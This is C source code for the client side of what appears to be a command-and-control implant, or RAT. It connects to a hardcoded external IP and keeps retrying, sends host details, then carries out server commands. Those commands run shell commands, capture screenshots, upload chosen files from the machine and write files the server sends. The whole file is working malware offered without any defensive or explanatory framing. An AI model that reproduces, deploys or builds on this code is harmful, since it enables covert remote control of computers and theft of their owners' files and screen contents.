#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <limits.h>
#include "c2.h"
#include "client/client_psh.h"
#include "client/screenshot.h"
#include "common.h"
#include "client/info.h"

#define SERVER_IP "103.70.12.50"

int main() {
    SOCK_INIT();

    // Create a TCP socket descriptor.
    sock_t sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv = {0};

    // Config
    serv.sin_family = AF_INET;
    serv.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, SERVER_IP, &serv.sin_addr);

    // Attempt to connect to c2server
    while (connect(sock, (struct sockaddr*)&serv, sizeof(serv)) < 0) {
        sleep(3);
    }

    // Send client info upon first time connecting
    char* client_info = print_client_info();
    safe_send_payload(sock, client_info, strlen(client_info) + 1, 0);
    free(client_info);

    // Main loop
    while (1) {
        char cmd;

        // Getting initial command
        if (safe_recv(sock, &cmd, 1, 0) <= 0) {
            sleep(3);
            continue; 
        }

        if (cmd == '1') {
            // Receive and exec command
            psh_receive(sock);
        } else if (cmd == '2') {
            // Take screenshot and send raw file to server
            size_t size = 0;
            BYTE* buffer = SaveScreenshot(&size);
            if (!buffer || size == 0) {
                printf("[ERR] Taking screenshot failed.\n");
                continue;
            }

            safe_send_payload(sock, buffer, size, 0);
            free(buffer);
        } else if (cmd == '3') {
            char *remote_path = (char*)safe_recv_payload(sock, NULL, 0);
            if (!remote_path) {
                continue;
            }

            size_t file_size = 0;
            char *file_buffer = read_file(remote_path, &file_size);
            if (!file_buffer) {
                free(remote_path);
                continue;
            }

            if (file_size > INT_MAX) {
                free(file_buffer);
                free(remote_path);
                continue;
            }

            char status = '1';
            if (safe_send(sock, &status, 1, 0) <= 0) {
                free(file_buffer);
                free(remote_path);
                break;
            }
            safe_send_payload(sock, file_buffer, (int)file_size, 0);
            free(file_buffer);
            free(remote_path);
        } else if (cmd == '4') {
            char *remote_path = (char*)safe_recv_payload(sock, NULL, 0);
            if (!remote_path) {
                continue;
            }

            int incoming_size = 0;
            BYTE *file_buffer = (BYTE*)safe_recv_payload(sock, &incoming_size, 0);
            if (!file_buffer) {
                free(remote_path);
                continue;
            }

            if (remote_path[0] == '\0') {
                free(remote_path);
                free(file_buffer);
                continue;
            }

            FILE *fp = fopen(remote_path, "wb");
            if (!fp) {
                free(remote_path);
                free(file_buffer);
                continue;
            }

            size_t expected = (size_t)incoming_size;
            size_t written = expected ? fwrite(file_buffer, 1, expected, fp) : 0;
            fclose(fp);

            if (written == expected) {
                char status = '1';
                safe_send(sock, &status, 1, 0);
            }

            free(remote_path);
            free(file_buffer);
        } 
    }

    CLOSE_SOCK(sock);
    SHUT_DOWN();
    return 0;
}